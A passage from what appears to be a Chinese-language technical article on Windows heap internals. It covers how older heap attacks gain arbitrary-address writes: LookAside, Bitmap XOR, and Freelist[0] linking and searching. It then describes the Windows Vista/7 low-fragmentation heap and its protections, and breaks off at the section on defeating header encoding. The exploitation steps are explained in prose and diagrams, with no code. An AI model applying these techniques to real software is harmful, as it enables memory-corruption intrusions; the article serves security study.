Unlink(3)"></p><p>在下次申请该大小的堆块时，按照算法会将Freelist[x].Blink指向的堆块分配给用户使用，而在之前构造好的条件下会将Freelist[x-1].Blink及下方的空间当成堆块分配给用户，并且该堆块的用户区指针为Freelist[x].Blink。此时我们第一次对指针进行写时，会从Freelist[x-1].Blink往下写，很容易将Freelist[x].Blink覆盖为任意地址，第二次写时即可往任意地址写任意数据。</p><h3 id="3-5-2-LookAside-Attack"><a href="#3-5-2-LookAside-Attack" class="headerlink" title="3.5.2 LookAside Attack"></a>3.5.2 LookAside Attack</h3><h4 id="3-5-2-1-漏洞成因"><a href="#3-5-2-1-漏洞成因" class="headerlink" title="3.5.2.1 漏洞成因"></a>3.5.2.1 漏洞成因</h4><p>该漏洞的产生是由于快表在分配堆块时，未检测其Flink字段指向地址的合法性，会造成在按照快表分配算法执行时，会将非法地址作为堆头分配给用户，最终导致任意地址写任意长度数据的漏洞。</p><h4 id="3-5-2-2-利用方式"><a href="#3-5-2-2-利用方式" class="headerlink" title="3.5.2.2 利用方式"></a>3.5.2.2 利用方式</h4><p>在堆溢出的基础上，使与可溢出堆块相邻的下一个堆块链入空表，再利用堆溢出将链入空表堆块的前项指针修改为函数跳转地址或虚表地址。构造好堆块后，在接下来快表第一次分配相应大小的堆块时会将被篡改堆头的堆块分配给用户使用，并将非法Flink地址作为堆头链入空表头结点，在快表第二次分配相应大小的堆块时，即可将指定地址及其后方空间作为堆块申请给用户使用，再对堆块进行赋值即可造成任意地址写任意数据的操作。该伪造的地址一般可以为敏感函数、虚表地址等以及上文所提到的该版本中的堆攻击重灾区：P.E.B结构及异常处理机制中的各种结构。整个过程如图14所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-f41a694097c493e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图14 LookAside Attack利用过程"></p><h3 id="3-5-3-Bitmap-XOR-Attack"><a href="#3-5-3-Bitmap-XOR-Attack" class="headerlink" title="3.5.3 Bitmap XOR Attack"></a>3.5.3 Bitmap XOR Attack</h3><h4 id="3-5-3-1-漏洞成因"><a href="#3-5-3-1-漏洞成因" class="headerlink" title="3.5.3.1 漏洞成因"></a>3.5.3.1 漏洞成因</h4><p>该漏洞产生的原因为在更新空表位图状态时，以当前堆块的Size字段作为索引，且在之前未有适当的安全检测机制，可能会导致空表位图状态与实际空表状态不同步的效果，最终通过利用漏洞会达到任意地址写任意数据的效果。空表位图更新算法的伪代码如图15所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-f3f5b460e01af3ec.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图15 空表位图更新算法"></p><h4 id="3-5-3-2-利用方式"><a href="#3-5-3-2-利用方式" class="headerlink" title="3.5.3.2 利用方式"></a>3.5.3.2 利用方式</h4><p>如上文空表位图更新算法所示，在每次空表中的堆块进行Unlink操作后会判断相应的空表位图是否需要更新，若Unlink的堆块为该空表中的最后一个堆块，则会对堆块当前Size字段对应的空表位图做异或操作。在基于堆溢出的场景中，该算法中存在多处漏洞。</p><p>首先构造只存在一个堆块的空表且与该堆块相邻前一堆块存在堆溢出的场景。如图16所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-3ce221a95bb6fa4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图16 Bitmap XOR Attack(1)"></p><p>若此时上方堆块只存在单字节溢出漏洞，即仅能覆盖到空表中堆块的Size字段。在对空表中堆块进行Unlink操作前，先将其Size字段篡改为8*n，如图17所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-469ca21a8fe86945.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图17 Bitmap XOR Attack(2)"></p><p>按照空表位图更新算法，该堆块会正常进行Unlink操作，并且会执行更新空表位图的代码。但是由于Size字段已被覆盖，导致在索引空表位图时不再是Bitmap[x]而是Bitmap[n]，然后对索引到的空表位图做异或操作，即Bitmap[x]不改变，Bitmap[n]进行反转。如图18所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-0dc408c61ab4b4ab.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图18 Bitmap XOR Attack(3)"></p><p>此时x号空表中没有堆块，表头的前项指针和后项指针都指向自身，并且对应的空表位图置位为1，即堆管理器认为x号空表中仍有空闲堆块。在下一次申请8<em>x大小的堆块时，则会将Freelist[x].Blink指向的地址作为堆块分配给用户使用，即将8</em>x大小的空表表头当做堆块，在用户进行编辑后的第二次申请编辑时即可造成任意地址写任意数据。</p><p>以上讨论了堆溢出仅能覆盖堆块Size字段时的场景，在当堆溢出能够覆盖到堆块的前项和后项指针字段时，该攻击手法的应用场景更加广泛。</p><p>首先，将前项指针和后项指针覆盖为相同值，此时按照空表位图更新算法，在Safe Unlink的安全检测机制处会被检查出来，且不会对该堆块执行Unlink操作，而是调用了RtlpHeapReportCorruption()。如上文所提到的，在现阶段的版本中该函数不会导致进程结束。因此，prev和next并未被新赋值，仍然为覆盖后相等的状态，因此会被判断为需要更新空表位图，并且此时的Size字段也是在堆溢出的覆盖范围内，之后的操作与第一种场景中相同，此处不再赘述。</p><p>在构造的第二种场景中，由于跳过了Unlink的赋值，prev和next始终相等，一定会更新空表位图。因此不需要满足被溢出堆块为其空表中的唯一一个堆块的条件，所以应用场景更加广泛</p><h3 id="3-5-4-Freelist-0-Linking-Attack"><a href="#3-5-4-Freelist-0-Linking-Attack" class="headerlink" title="3.5.4 Freelist[0] Linking Attack"></a>3.5.4 Freelist[0] Linking Attack</h3><h4 id="3-5-4-1-漏洞成因"><a href="#3-5-4-1-漏洞成因" class="headerlink" title="3.5.4.1 漏洞成因"></a>3.5.4.1 漏洞成因</h4><p>在引入Safe Unlink机制使得Unlink操作变得困难后，研究人员们将目光投向了Unlink的逆过程Link。很快他们就发现了Link操作尚未添加保护机制检测堆块前项指针和后向指针的合法性，并在对指针进行赋值操作时能产生和DWORD SHOOT效果相似的漏洞。但是相较于DWORD SHOOT存在一定的局限性，该漏洞最终只能达到任意地址写4字节堆块地址的效果。Link算法伪代码如图19所示，其中ChunkA为将要链入0号空表的堆块，ChunkB为本就在0号空表中的堆块。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-0d9935f37a722361.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图19 Link算法"></p><h4 id="3-5-4-2-利用方式"><a href="#3-5-4-2-利用方式" class="headerlink" title="3.5.4.2 利用方式"></a>3.5.4.2 利用方式</h4><p>首先构造一个在Freelist[0]中并且与该堆块相邻的前一堆块存在至少0x10字节溢出的场景，并且该堆块的大小应该大于其后项堆块大小的两倍，本场景中为0x550&gt;0x220*2。如图20所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-a0ff498d46be23be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图20 Freelist[0] Linking Attack(1)"></p><p>在从0号空表中申请堆块前将空表中堆块的堆头溢出，覆盖其前项后项指针，在该攻击方式中Size字段甚至可以不变。如图21所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-b1303c651af8017e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图21 Freelist[0] Linking Attack(2)"></p><p>此时，申请一个大于其后项堆块小于自身，且与自身的差大于申请堆块大小的堆块，本场景中为0x250(0x550&gt;0x250&gt;0x220且0x550-0x250&gt;0x250)。按照0号空表的分配算法，首先会对0x550堆块进行Unlink操作，由于前项后项指针被篡改后不通过Safe Unlink的检查机制，因此不会执行Unlink而直接将该堆块切分为0x250堆块和0x300堆块。其中的0x250堆块分配给用户使用，0x300堆块被插入到0号空表中的合适位置。根据算法，该合适位置将会是0x250堆块之后。如图22所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-e77820f9c24f709a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图22 Freelist[0] Linking Attack(3)"></p><p>该堆块在合适位置进行Link操作前，需满足相对Fake_Flink和Fake_Blink的Size字段大于插入堆大小的条件，本场景中为[Fake_Flink-8]&gt;0x300和[Fake_Blink-0xc]&gt;0x300。除此之外，还需满足并且Fake_Flink及Fake_Blink+4的地址可写的条件。</p><p>在满足上述各项条件后，0x300堆块插入0号空表合适位置时，按照Link算法将会触发漏洞的效果如图23所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-63963ffdd1e2aeae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图23 触发效果"></p><p>由于Fake_Flink及Fake_Blink都是通过堆溢出可控的字段，因此触发该漏洞达到了任意地址写堆块地址的效果。虽然该攻击手段利用条件十分苛刻且单靠其很难劫持控制流，但可同时配合其他漏洞达成更具有攻击性的目的。</p><h3 id="3-5-5-Freelist-0-Searching-Attack"><a href="#3-5-5-Freelist-0-Searching-Attack" class="headerlink" title="3.5.5 Freelist[0] Searching Attack"></a>3.5.5 Freelist[0] Searching Attack</h3><h4 id="3-5-5-1-漏洞成因"><a href="#3-5-5-1-漏洞成因" class="headerlink" title="3.5.5.1 漏洞成因"></a>3.5.5.1 漏洞成因</h4><p>该漏洞的产生是由于0号空表在进行遍历搜索合适堆块时，未对链表中堆块前项指针的合法性进行校验，导致在遍历时跳出0号空表，最终通过利用漏洞达到任意地址写任意数据的效果。</p><h4 id="3-5-5-2-利用方式"><a href="#3-5-5-2-利用方式" class="headerlink" title="3.5.5.2 利用方式"></a>3.5.5.2 利用方式</h4><p>首先构造一个在Freelist[0]中并且与该堆块相邻的前一堆块存在至少0xc字节溢出的场景，并且该堆块不能为0号空表中的最大块。如图24所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-64d98552f768fe78.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图24 Freelist[0] Searching Attack(1)"></p><p>在遍历0号空表中前将空表中堆块的堆头溢出，覆盖其前项指针，在该攻击方式中Size字段甚至可以不变。如图25所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-5eb750249e80f224.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图25 Freelist[0] Searching Attack(2)"></p><p>此时，申请一个大于该堆块且小于0号空表中最大堆块大小的堆块。按照0号空表的搜索算法，在遍历过被溢出堆块后，会将伪造的Fake_Flink作为下一个堆块的入口地址，比较其Size字段是否满足申请空间的大小。如图26所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-a9fd7bb2efcf8d57.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图26 Freelist[0] Searching Attack(3)"></p><p>为了使堆管理器将该Fake_Flink地址作为堆块入口分配给用户使用，需要满足[Fake_Flink-8]的Size字段大于申请大小，并且为了不产生堆切割及其后续繁琐操作，应该控制该Size字段在申请堆块大小+8字节之内，即RequstSize≤Size≤RequestSize+8。在Size字段条件满足后，该伪造堆块会进行Unlink操作，虽然会毫无悬念地被Safe Unlink机制检测出来，但仍然会被分配给用户使用。由于会进行Safe Unlink检测，因此该堆块的Flink及Bilnk，即Fake_Flink和Fake_Flink+4应该是可读的。</p><p>由于Fake_Flink为堆溢出所伪造，因此只需要攻击者构造满足上述条件的Fake_Flink，即可达到任意地址写任意数据的效果。</p><h1 id="四、-Windows-Vista-–-Windows-7"><a href="#四、-Windows-Vista-–-Windows-7" class="headerlink" title="四、 Windows Vista – Windows 7"></a>四、 Windows Vista – Windows 7</h1><h2 id="4-1-环境准备"><a href="#4-1-环境准备" class="headerlink" title="4.1 环境准备"></a>4.1 环境准备</h2><p>32位Windows 7 SP1虚拟机、OllyDbg、WinDbg。</p><h2 id="4-2-重要结构"><a href="#4-2-重要结构" class="headerlink" title="4.2 重要结构"></a>4.2 重要结构</h2><p>从Windows Vista版本开始，Windows系统舍弃了前版本中的以快表为核心的前端堆管理器，而引入了一套称为低碎片堆(Low Fragmentation Heap)的全新的数据结构和算法作为前端堆管理器，后端堆管理器为了适配新的前端堆管理器的在管理机制也与前版本的后端管理器有部分差异。</p><p>从该版本开始，由前端堆管理器分配给用户的堆块的结构改变成了UserBlocks，与之前版本中的Lookaside相类似。有后端堆管理器分配给用户的堆块结构改变成了ListHints,与之前版本中的Freelist相类似。除此之外，管理堆的HeapBase中有个FreeLists成员容易与之前版本中的Freelist相混淆，该成员链接了该HeapBase所管理的所有空闲堆的指针。值得一提的是，在下文中将用到新的单位block，1block=8byte。</p><h3 id="4-2-1-UserBlocks"><a href="#4-2-1-UserBlocks" class="headerlink" title="4.2.1 UserBlocks"></a>4.2.1 UserBlocks</h3><p>该结构体位于HeapBase(_HEAP)-&gt;FrontEndHeap(_LFH_HEAP)-&gt;LocalData(_HEAP_LOCAL_DATA)-&gt;SegmentInfo(_HEAP_LOCAL_SEGMENT_INFO)-&gt;ActiveSubsegment/Hint(_HEAP_SUBSEGMENT)结构体中。</p><p>由于前端堆的管理结构较为复杂，本文挑选其中重要结构体中的重要成员进行阐述。</p><h4 id="4-2-1-1-LFH-HEAP"><a href="#4-2-1-1-LFH-HEAP" class="headerlink" title="4.2.1.1 _LFH_HEAP"></a>4.2.1.1 _LFH_HEAP</h4><p>FrontEndHeap的数据结构_LFH_HEAP如图27所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-1723ffae5bb7bcaa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图27 _LFH_HEAP数据结构"></p><p>_LFH_HEAP结构体中我们主要关心LocalData字段，该字段是一个指针，保存了每个维护UserBlocks的SubSegment的信息。</p><h4 id="4-2-1-2-HEAP-LOCAL-DATA"><a href="#4-2-1-2-HEAP-LOCAL-DATA" class="headerlink" title="4.2.1.2 _HEAP_LOCAL_DATA"></a>4.2.1.2 _HEAP_LOCAL_DATA</h4><p>LocalData的数据结构_HEAP_LOCAL_DATA如图28所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-49940cc7e1d21299.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图28 _HEAP_LOCAL_DATA数据结构"></p><p>_HEAP_LOCAL_DATA结构体中共包含了大小为128的SegmentInfo数组，该数组中的每个元素都按照_RtlpBucketBlockSizes数组中所对应的大小(不包括堆头大小)维护着所有小于16KB的UserBlocks。该数组如图29所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-eef983beb7d0aaa0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图29 _RtlpBucketBlockSizes数组"></p><p>例如SegmentInfo[0]维护着所有用户区为0字节的堆块，由于不存在，所以SegmentInfo[0]不维护堆块，SegmentInfo[8]则维护着所有用户区为0x40字节的堆块。</p><h4 id="4-2-1-3-HEAP-LOCAL-SEGMENT-INFO"><a href="#4-2-1-3-HEAP-LOCAL-SEGMENT-INFO" class="headerlink" title="4.2.1.3 _HEAP_LOCAL_SEGMENT_INFO"></a>4.2.1.3 _HEAP_LOCAL_SEGMENT_INFO</h4><p>SegmentInfo的数据结构_HEAP_LOCAL_SEGMENT_INFO如图30所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-d3b0221f10bd825a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图30 _HEAP_LOCAL_SEGMENT_INFO数据结构"></p><p>Hint和ActiveSubsegment都是直接管理UserBlocks的字段，初始化为NULL，其中Hint字段仅在free了前端管理器所分配的堆块后才会被赋值，ActiveSubsegment字段在第一次请求分配时就会被赋值，两个字段相辅相成，为方便表述，以下以Hint字段为例进行进一步的说明。</p><p>LocalData字段指向管理该SegmentInfo的LocalData地址。</p><p>BucketIndex字段表示该SegmentInfo所维护的堆块用户区的blcok尺寸。</p><h4 id="4-2-1-4-HEAP-SUBSEGMENT"><a href="#4-2-1-4-HEAP-SUBSEGMENT" class="headerlink" title="4.2.1.4 _HEAP_SUBSEGMENT"></a>4.2.1.4 _HEAP_SUBSEGMENT</h4><p>Hint的数据结构_HEAP_SUBSEGMENT如图31所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-f19e15cfd3186107.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图31 _HEAP_SUBSEGMENT数据结构"></p><p>LocalInfo字段指向管理该Hint/ActiveSubsegment的SegmentInfo地址。</p><p>UserBlocks字段为用户堆块开始的头部，紧接着UserBlocks之后就是相连的大小固定的用户区。下面以SegmentInfo[5]-&gt;Hint.UserBlcks所维护的大小为0x30(用户区为0x28)的堆块为例，其在内存空间上如图32所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-da8a175163d10394.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图32 SegmentInfo[5]-&gt;Hint.UserBlocks"></p><p>值得一提的是，空闲状态堆块用户区的前2字节会存放下一个空闲堆的偏移，以方便在申请堆块时及时更新下文中提到的AggregateExchg中的FreeEntryOffset字段，如图33所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-6454491fe8327b4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图33 用户区偏移"></p><p>BlockSize字段表示该结构体所维护堆块(包括堆头)的block尺寸。</p><p>BlockCount字段表示该结构体所维护的所有堆块的数量。</p><p>SizeIndex字段表示该结构体所维护堆块用户区的block尺寸，与之前提到的BucketIndex相同，即存在以下等式：BucketIndex=SizeIndex=BlockSize-1。</p><p>AggregateExchg字段指向_INTERLOCK_SEQ结构体，该用于在分配和释放堆块时索引相应堆块。</p><h4 id="4-2-1-5-INTERLOCK-SEQ"><a href="#4-2-1-5-INTERLOCK-SEQ" class="headerlink" title="4.2.1.5 _INTERLOCK_SEQ"></a>4.2.1.5 _INTERLOCK_SEQ</h4><p>AggregateExchg的数据结构_INTERLOCK_SEQ如图34所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-6a2a03f84598241a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图34 _INTERLOCK_SEQ数据结构"></p><p>Depth字段记录了在UserBlocks中的空闲堆块个数。</p><p>FreeEntryOffset字段表示从UserBlocks头部索引到下一个将要分配的堆块的block尺寸，即下一个分配堆块的地址为UserBlocks+8*FreeEntryOffset。</p><h3 id="4-2-2-FreeLists"><a href="#4-2-2-FreeLists" class="headerlink" title="4.2.2 FreeLists"></a>4.2.2 FreeLists</h3><p>该结构体位于HeapBase(_HEAP)结构体中。</p><h4 id="4-2-2-1-LIST-ENTRY"><a href="#4-2-2-1-LIST-ENTRY" class="headerlink" title="4.2.2.1 _LIST_ENTRY"></a>4.2.2.1 _LIST_ENTRY</h4><p>FreeLists的_LIST_ENTRY结构如图35所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-63ca2d7d22d78a41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图35 _HEAP_ENTRY结构体"></p><p>该结构相对简单，Flink和Blink即后项指针和前项指针。FreeLists为双向链表，将该HeapBase所管理的所有后端分配的空闲堆块按照大小由小到大的顺序链在一起。</p><h3 id="4-2-3-ListHints"><a href="#4-2-3-ListHints" class="headerlink" title="4.2.3 ListHints"></a>4.2.3 ListHints</h3><p>该结构体位于HeapBase(_HEAP)-&gt;BlocksIndex(_HEAP_LIST_LOOKUP)结构体中。</p><h4 id="4-2-3-1-HEAP-LIST-LOOKUP"><a href="#4-2-3-1-HEAP-LIST-LOOKUP" class="headerlink" title="4.2.3.1 _HEAP_LIST_LOOKUP"></a>4.2.3.1 _HEAP_LIST_LOOKUP</h4><p>管理ListHints的_HEAP_LIST_LOOKUP结构体数据结构如图36所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-38b409518b897bcc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图36 _HEAP_LIST_LOOKUP数据结构"></p><p>下面针对该版本下此结构体中的重要成员进行讲解。</p><p>若该结构体需要扩展，则ExtendedLookup为指向下一个_HEAP_LIST_LOOKUP的指针，若不需要扩展，则为NULL。</p><p>ArraySize为在该结构中ListHints可以寻址到的最大的block尺寸，在该阶段的版本中ArraySize的值为0x80或0x800。例如，HeapBase-&gt;BlocksIndex中的ArraySize为0x80，若有扩展，则扩展后结构中的ArraySize为0x800,即HeapBase-&gt;BlocksIndex-&gt;ExtendedLookup.ArraySize=0x800。</p><p>ItemCount的值表示该_HEAP_LIST_LOOKUP结构中free状态堆块的个数。</p><p>OutOfRangeItems的值表示该_HEAP_LIST_LOOKUP结构中超过ArraySize大小的堆块，即接下来即将提到的ListHints[ArraySize-BaseIndex-1]链表中的堆块个数。例如，该_HEAP_LIST_LOOKUP结构有扩展，则OutOfRangeItems为0。</p><p>BaseIndex的值表示该_HEAP_LIST_LOOKUP结构的起始block尺寸。例如，从_HEAP结构中的BlocksIndex索引到的_HEAP_LIST_LOOKUP结构中的该字段为0，而从_HEAP_LIST_LOOKUP结构中的ExtendedLookup索引到的_HEAP_LIST_LOOKUP结构中的改字段为0x80。</p><p>ListHead与HeapBase-&gt;FreeLists指向同一个地方，链接了该HeapBase所管理的所有空闲堆的指针。</p><p>ListsInUseUlong为一个数组，相当于一个ListHints 的BitMap。</p><p>ListHints也是一个_LIST_ENTRY结构体数组，_LIST_ENTRY结构体仅占8个字节，其中有2个大小为4字节的Flink和Blink字段。ListHints数组的索引号代表着所管理堆块的block尺寸，每个Flink指向_HEAP-&gt;FreeLists链上的第一个对应大小堆块。此处的Blink较为特殊，不会指向堆块的地址，而是在该大小堆块开启了LFH分配机制后会指向索引号对应的Buckets(_HEAP_BUCKET)+1地址；在未开启LFH分配机制时，Blink的前2字节表示所有占用状态该大小堆块总数的2倍，后2字节表示申请该大小堆块的总次数。另外，如前文中所提到的，ListHints[ArraySize-BaseIndex-1]的Flink指针会指向FreeLists链上第一个block尺寸大于ArraySize-1的空闲堆块，类似于前版本中的Freelist[0]。</p><p>总的来说，ListHints的Flink起着FreeLists链表堆缓存的作用，ListHints的Blink则起着连接后端堆管理器和前端堆管理器的作用，因为它标志着对应大小的堆块是否已启用LFH进行分配。</p><h2 id="4-3-堆块操作"><a href="#4-3-堆块操作" class="headerlink" title="4.3 堆块操作"></a>4.3 堆块操作</h2><h3 id="4-3-1-堆块分配"><a href="#4-3-1-堆块分配" class="headerlink" title="4.3.1 堆块分配"></a>4.3.1 堆块分配</h3><p>堆块在被申请时，主要会从上文提到的前端堆管理器和后端堆管理器中进行分配。</p><p>从前端堆管理器进行堆块分配时，会通过用户申请堆块大小索引到维护对应大小堆块的SegmentInfo数组，并获得SegmentInfo-&gt;Hint-&gt;AggregateExchg-&gt;OffsetAndDepth字段，在Depth非0的情况下，将UserBlocks+8*FreeEntryOffset地址的堆块分配给用户使用，然后将FreeEntryOffset字段更新为位于该堆块用户区前2字节的Offset，便于在下一次分配时进行寻址，并将Depth字段-1。</p><p>从后端堆管理器进行堆块分配时，会通过用户申请堆块大小索引到维护对应大小堆块的ListHints数组，并通过Flink指针找到在FreeLists链表中大小相对应的堆块，并进行Unlink操作将其从链表上卸下返回给用户使用。若未找到对应大小堆块则会向后遍历FreeLists链表，直到找到第一个最小满足申请大小的堆块进行切割分配。若遍历完整个链表仍然没有成功分配，则会扩展堆。该版本的后端堆管理器分配机制与前版本中有许多相似之处。</p><p>在用户申请分配某一大小的内存空间时，首先会判断申请大小，若大于0xFE00blocks，即504KB，则调用VirtualAlloc()进行分配，若大于0x800blocks，即16KB，则直接以后端堆管理器进行分配。若小于16KB，则先以后端堆管理器对这次分配操作进行响应，在BlocksIndex及ExtendedLookup结构中寻找相应大小的ListHints，在找到相对应大小的ListHints数组时会判断其Blink是否为奇数，即Buckets+1，若是则会将该分配操作交给前端堆管理器进行响应。若不为奇数，则判断Blink的低2字节是否大于0x20或高2字节是否大于0x1000，即判断在占用状态的该大小堆块的总数是否大于0x10或是否进行了0x1000次该大小堆块的申请。若判断为真，则会设置HeapBase-&gt;CompatibilityFlags，在下次再分配同样大小堆块时将Blink赋值为Buckets+1，并启用前端堆管理器响应堆块分配；若判断为假，则仍然采用后端堆管理器响应堆块分配，并将Blink的值加0x10002。</p><h3 id="4-3-2-堆块释放"><a href="#4-3-2-堆块释放" class="headerlink" title="4.3.2 堆块释放"></a>4.3.2 堆块释放</h3><p>在进行堆块释放操作时，系统遵循“从哪来，回哪去”的规则。在接收到堆块释放的请求时，系统会先判断堆的大小，所有大于504KB的堆块都直接调用VirtualFree()进行释放，小于504KB大于16KB的堆块都将链入FreeLists链表中。小于16KB的堆块，系统会通过堆头信息判断该堆块是从前端堆管理区进行分配还是后端堆管理区进行分配，若从前端分配，则将其释放回前端堆中，并将AggregateExchg结构中的FreeEntryOffset写入堆块用户区的前2字节，并用该堆块对于UserBlocks的偏移更新FreeEntryOffset字段，再将Depth字段+1。若从后端分配，则将其链入FreeLists链表中，并更新对应大小的ListHints中的Flink指针，再判断该对应大小是否已开启LFH分配策略，若未开启，则将Blink-0x0002。</p><h3 id="4-3-3-堆块合并"><a href="#4-3-3-堆块合并" class="headerlink" title="4.3.3 堆块合并"></a>4.3.3 堆块合并</h3><p>该阶段的堆块合并操作与前版本中几乎相同。在释放前端堆块时不会触发合并操作，在释放后端堆块时，若与该堆块毗邻的堆块为空闲堆块，则会进行堆块合并操作，合并后的堆块会重新链入FreeLists的合适位置，并更新相应大小的ListHints的对应数值。</p><h2 id="4-4-保护机制"><a href="#4-4-保护机制" class="headerlink" title="4.4 保护机制"></a>4.4 保护机制</h2><p>该阶段Windows系统在保护堆方面除继承前版本的保护机制外上又引入了一些额外的保护机制，如堆基址随机化、堆头编码、Safe Link等。这些保护机制的引入使得Windows操作系统的堆漏洞更难以被攻击者所利用。</p><h3 id="4-4-1-堆基址随机化"><a href="#4-4-1-堆基址随机化" class="headerlink" title="4.4.1 堆基址随机化"></a>4.4.1 堆基址随机化</h3><p>该机制会在创建堆时，将HeapBase的地址随机对齐到64KB地址，即将HeapBase随机对齐到低4字节为0的地址。该堆基址随机化与栈基址随机化有异曲同工之处，目的是让每次产生堆的地址都不相同，使得在漏洞利用时需要首先泄露随机化的堆基址，增大了漏洞利用的难度。</p><h3 id="4-4-2-堆头编码"><a href="#4-4-2-堆头编码" class="headerlink" title="4.4.2 堆头编码"></a>4.4.2 堆头编码</h3><p>如上文所述，在前一阶段的Windows版本中，引入了Heap Cookie这一重要保护机制。但经过实践的检验，这1字节的Heap Cookie并不能十分有效地阻止攻击者对堆头敏感数据的篡改：攻击者可通过多次爆破来碰撞仅仅1字节的Heap Cookie。</p><p>为了更好的保护堆头敏感信息不被攻击者恶意篡改，Windows在该阶段引入了堆头编码的保护机制。在介绍该机制前首先简要介绍一下堆头的_HEAP_ENTRY结构体，如图37所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-e2cf0539194ec408.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图37 _HEAP_ENTRY数据结构"></p><p>堆头编码机制会首先确定该堆区是否已开启堆头编码机制，若已开启则将堆头中代表Size以及Flags的前三个字节逐字节异或后赋值给SmallTagIndex，之后再与随机生成的每个HeapBase都不同的HeapBase-&gt;Encoding进行异或运算得到编码过后的堆头。堆头编码算法伪代码如图38所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-1bfec2fee855461d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图38 EncodeHeader算法"></p><p>在解码时，会首先判断该堆头是否已经编码，若已编码则将堆头与HeapBase-&gt;Encoding进行异或运算解码得到真实的堆头，从而获得Size以及Flags字段中的数据。堆头解码算法伪代码如图39所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-12b757d693edd043.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图39 DecodeHeader算法"></p><p>在开启了该机制后，攻击者将很难在不泄露任何信息的条件下修改堆头中的Size及Flags等敏感信息。该机制较前版本中的Heap Cookie机制更有效地保护了堆头信息。</p><h3 id="4-4-3-Safe-Link"><a href="#4-4-3-Safe-Link" class="headerlink" title="4.4.3 Safe Link"></a>4.4.3 Safe Link</h3><p>如上文所述，前一阶段的Windows版本中，引入了Safe Unlink保护机制后，攻击者又在Link操作时发现了可利用的漏洞。为了完善操作链表时的保护机制，Windows在该阶段引入了Safe Link的保护机制。该保护机制会判断在链入堆块前判断链表上将要断链的地方的Blink和Flink是否合法，若合法则进行Link操作，若不合法则调用RtlpLogHeapFailure()结束进程。Safe Link的算法伪代码如图40所示。</p><p><img src="https://upload-images.jianshu.io/upload_images/8447551-3fce1af44645d757.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图40 Safe Link算法"></p><h3 id="4-4-4-HeapEnableTerminateOnCorrupton"><a href="#4-4-4-HeapEnableTerminateOnCorrupton" class="headerlink" title="4.4.4 HeapEnableTerminateOnCorrupton"></a>4.4.4 HeapEnableTerminateOnCorrupton</h3><p>如上文所述，在前一阶段版本加入的安全机制中，检测不通过时会调用RtlpHeapReportCorruption()。但是由于HeapEnableTerminateOnCorrupton字段默认不启用，导致在检测不通过后继续进程，因此导致了上文所述的多种利用手法的存在。在本阶段的版本中，默认启用了HeapEnableTerminateOnCorruption字段，使得在安全机制检测不通过时直接结束进程，杜绝了上一阶段版本中的多种攻击手法。</p><h2 id="4-5-漏洞利用"><a href="#4-5-漏洞利用" class="headerlink" title="4.5 漏洞利用"></a>4.5 漏洞利用</h2><p>该阶段的版本中，Windows的堆管理机制有了较大的修改，新加入了多种数据结构以及一些关键性的保护机制，是Windows操作系统安全性发展的一个里程碑，同时也使得堆漏洞的利用难度提升到了一个新高度。</p><h3 id="4-5-1-突破堆头编码"><a href="#4-5-1-突破堆头编码" class="headerlink" title="4.5.1 突破堆头编码"></a>4.5.1 